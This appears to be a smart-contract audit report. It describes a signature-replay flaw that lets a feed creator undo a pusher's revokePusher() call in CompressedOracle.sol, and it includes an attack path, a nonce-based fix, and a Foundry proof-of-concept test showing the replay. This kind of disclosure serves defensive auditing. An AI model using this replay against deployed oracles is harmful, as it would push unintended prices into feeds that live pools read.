### Title
Creator can replay pusher consent signature to bypass `revokePusher()` protection, re-establishing write authority over the creator's feed namespace — (`smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol`)

---

### Summary

`revokePusher()` is the pusher's only self-protection mechanism: it clears `namespaceRemapping[msg.sender]` so the pusher's future fallback pushes land in their own namespace instead of the creator's. However, `allowPushers()` contains no check that the pusher has not already revoked. A creator who retains the original consent signature can call `allowPushers()` again with the same signature at any time before the deadline, silently re-establishing the delegation and forcing the pusher's subsequent pushes back into the creator's feed namespace — exactly as if `revokePusher()` had never been called.

---

### Finding Description

`allowPushers` signs consent as:

```
keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
```

The signed message binds chain, oracle address, deadline, pusher address, and creator address. It does **not** bind any revocation state, nonce, or "delegation-active" flag. The only replay guard is the deadline check `block.timestamp <= deadline`.

The code comment on `allowPushers` explicitly acknowledges the risk:

> *"The deadline is likewise required: the signed consent carries no timestamp of its own, so an undated signature could re-establish a delegation AFTER the pusher revoked it."*

But the deadline only prevents replay **after** the deadline expires. It does nothing to prevent replay **after revocation but before the deadline**. During that window the creator holds a fully valid, unexpired signature and can call `allowPushers` again:

```solidity
// allowPushers — no check that namespaceRemapping[pusher] == address(0)
namespaceRemapping[pusher] = msg.sender;   // overwrites the cleared mapping
emit PusherAuthorized(pusher, msg.sender);
```

`revokePusher` clears the mapping:

```solidity
namespaceRemapping[msg.sender] = address(0);
emit PusherRevoked(msg.sender, creator);
```

But `allowPushers` immediately re-sets it with the same signature. The pusher has no on-chain way to invalidate the old signature before the deadline.

**Attack path:**

1. Pusher signs consent for creator with `deadline = now + 30 days`.
2. Creator calls `allowPushers(deadline, [pusher], [sig])` → `namespaceRemapping[pusher] = creator`.
3. Pusher discovers the creator's feed is being used for a pool with manipulated parameters, or the pusher has changed their price methodology. Pusher calls `revokePusher()` → `namespaceRemapping[pusher] = address(0)`.
4. Creator immediately calls `allowPushers(deadline, [pusher], [sig])` with the **same signature** (deadline still valid) → `namespaceRemapping[pusher] = creator` again.
5. The pusher's fallback pushes continue to land in the creator's namespace. The pusher cannot stop this until the deadline expires.

This is structurally identical to the external report's token guardian bypass: the protection mechanism (`revokePusher` / `enableTokenGuardian`) checks only the subject's own state, but the re-delegation path (`allowPushers` / `approve`) checks only the caller's credentials — not whether the subject has already exercised their revocation right.

---

### Impact Explanation

After a pusher revokes, they may begin pushing prices for a different asset or with a different methodology into their own namespace. The creator's replay forces those pushes back into the creator's namespace. Any pool whose `AnchoredPriceProvider` reads the creator's feed now receives price data the pusher no longer intends for that feed — potentially wrong-asset or wrong-methodology prices. Because `CompressedOracleV1.price()` is open (no pool binding), the corrupted feed value is immediately readable by any provider or pool that references the creator's `feedId`. If the `AnchoredPriceProvider`'s staleness and spread guards pass, the bad mid price flows directly into `_computeBidAsk`, producing a corrupted bid/ask that reaches live swaps.

---

### Likelihood Explanation

- The creator retains the original signature (they submitted it themselves in step 2).
- The replay requires only a single public transaction with no additional privileges.
- The window is bounded by the deadline, but deadlines of hours to days are normal operational practice.
- The pusher has no on-chain countermeasure during the window.

Likelihood is **medium**: it requires a motivated creator and a prior delegation, but the replay itself is trivially executable.

---

### Recommendation

Include a per-pusher nonce in the signed message and increment it on every revocation:

```diff
+ mapping(address => uint256) public pusherNonce;

  function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
      _ensureDeadline(deadline);
      ...
      bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
-         keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
+         keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender, pusherNonce[pusher]))
      );
      require(pusher == ECDSA.recover(hash, signatures[i]));
      namespaceRemapping[pusher] = msg.sender;
      ...
  }

  function revokePusher() external {
      address creator = namespaceRemapping[msg.sender];
      if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
      namespaceRemapping[msg.sender] = address(0);
+     pusherNonce[msg.sender]++;          // invalidates all prior consent signatures
      emit PusherRevoked(msg.sender, creator);
  }
```

This ensures that any signature the creator holds is invalidated the moment the pusher revokes, making `revokePusher()` an effective and irrevocable protection mechanism.

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {CompressedOracleV1} from "../contracts/oracles/compressed/CompressedOracle.sol";

contract PusherRevocationBypass_POC is Test {
    CompressedOracleV1 oracle;

    uint256 constant CREATOR_KEY = 0xC0FFEE;
    uint256 constant PUSHER_KEY  = 0xBEEF;

    address creator;
    address pusher;

    function setUp() public {
        vm.warp(1_700_000_000);
        oracle   = new CompressedOracleV1(address(this), 0);
        creator  = vm.addr(CREATOR_KEY);
        pusher   = vm.addr(PUSHER_KEY);
    }

    function testRevocationBypassedBySignatureReplay() public {
        uint256 deadline = block.timestamp + 1 days;

        // Pusher signs consent for creator
        bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
            keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
        );
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
        bytes memory sig = abi.encodePacked(r, s, v);

        address[] memory pushers = new address[](1);
        pushers[0] = pusher;
        bytes[] memory sigs = new bytes[](1);
        sigs[0] = sig;

        // Step 1: Creator establishes delegation
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);
        assertEq(oracle.namespaceRemapping(pusher), creator, "delegation established");

        // Step 2: Pusher revokes — intends to push into own namespace from now on
        vm.prank(pusher);
        oracle.revokePusher();
        assertEq(oracle.namespaceRemapping(pusher), address(0), "revocation cleared mapping");

        // Step 3: Creator replays the SAME signature — deadline still valid
        vm.prank(creator);
        oracle.allowPushers(deadline, pushers, sigs);

        // Revocation was bypassed: pusher is re-delegated to creator's namespace
        assertEq(oracle.namespaceRemapping(pusher), creator,
            "FAIL: revokePusher() bypassed — pusher is re-delegated without new consent");

        // Step 4: Pusher's next fallback push lands in creator's namespace, not pusher's own
        uint56 tsMs = uint56(block.timestamp * 1000);
        uint256 word = (uint256(tsMs) << 8) | uint256(7); // slotId=7
        word |= uint256(uint48((uint48(1_234_567) << 16) | (uint48(3) << 8) | uint48(5))) << 208;

        vm.prank(pusher);
        (bool ok,) = address(oracle).call(abi.encodePacked(word));
        assertTrue(ok);

        // Price lands in creator's namespace — pusher's own namespace is empty
        bytes32 creatorFeed = oracle.feedIdOf(creator, 7, 0);
        bytes32 pusherFeed  = oracle.feedIdOf(pusher,  7, 0);
        assertGt(oracle.getOracleData(creatorFeed).price, 0, "creator feed updated against pusher's will");
        assertEq(oracle.getOracleData(pusherFeed).price,  0, "pusher's own namespace stays empty");
    }
}
```
